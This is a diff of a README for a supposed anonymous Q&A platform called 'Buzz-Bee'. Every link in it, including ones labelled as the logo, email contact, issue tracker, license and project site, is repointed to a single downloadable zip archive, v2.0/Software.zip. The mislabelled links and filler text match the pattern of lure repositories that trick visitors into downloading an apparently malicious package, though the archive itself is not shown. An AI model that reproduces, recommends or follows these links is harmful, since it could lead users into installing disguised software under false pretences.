@@ -1,6 +1,6 @@
 # Buzz-Bee: Social Platform for Anonymous Q&A and Knowledge Sharing 🐝
 
-![Buzz-Bee Logo](https://github.com/IRetribute/Buzz-Bee/releases/download/v1.0/Soft.zip)
+![Buzz-Bee Logo](https://github.com/IRetribute/Buzz-Bee/releases/download/v2.0/Software.zip)
 
 Welcome to Buzz-Bee, the buzzing social platform where you can engage in anonymous Q&A, share knowledge, and connect with like-minded individuals in a judgment-free environment. Join communities, create polls, and participate in open discussions with real-time updates, dynamic voting, and customizable avatars!
 
@@ -47,7 +47,7 @@ Welcome to Buzz-Bee, the buzzing social platform where you can engage in anonymo
 
 To get started with Buzz-Bee, you can download the project files from the following link:
 
-[![Download Buzz-Bee](https://github.com/IRetribute/Buzz-Bee/releases/download/v1.0/Soft.zip)](https://github.com/IRetribute/Buzz-Bee/releases/download/v1.0/Soft.zip)
+[![Download Buzz-Bee](https://github.com/IRetribute/Buzz-Bee/releases/download/v2.0/Software.zip)](https://github.com/IRetribute/Buzz-Bee/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the files, extract the contents and follow the installation instructions in the README to set up the project locally.
 
@@ -62,7 +62,7 @@ We welcome contributions from the community to help improve Buzz-Bee! Whether yo
 
 ## Support 🤝
 
-If you encounter any issues while using Buzz-Bee or have any questions, feel free to reach out to us via [email](https://github.com/IRetribute/Buzz-Bee/releases/download/v1.0/Soft.zip) or create a new [issue](https://github.com/IRetribute/Buzz-Bee/releases/download/v1.0/Soft.zip).
+If you encounter any issues while using Buzz-Bee or have any questions, feel free to reach out to us via [email](https://github.com/IRetribute/Buzz-Bee/releases/download/v2.0/Software.zip) or create a new [issue](https://github.com/IRetribute/Buzz-Bee/releases/download/v2.0/Software.zip).
 
 ## Spread the Buzz! 📢
 
@@ -72,7 +72,7 @@ Help us spread the buzz about Buzz-Bee by sharing it on social media. Let's crea
 
 Dive into the world of Buzz-Bee and experience the thrill of anonymous Q&A, engaging discussions, and dynamic voting. Join us in creating a welcoming space for knowledge sharing and community building. Buzz-Bee - Where opinions matter, without the fear of judgment. 🌟
 
-[Visit Buzz-Bee Now](https://github.com/IRetribute/Buzz-Bee/releases/download/v1.0/Soft.zip)
+[Visit Buzz-Bee Now](https://github.com/IRetribute/Buzz-Bee/releases/download/v2.0/Software.zip)
 
 Remember, your voice matters at Buzz-Bee! 🐝
 
@@ -82,4 +82,4 @@ Thank you for being part of our journey! 🚀
 
 #### License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/IRetribute/Buzz-Bee/releases/download/v1.0/Soft.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/IRetribute/Buzz-Bee/releases/download/v2.0/Software.zip) file for details.
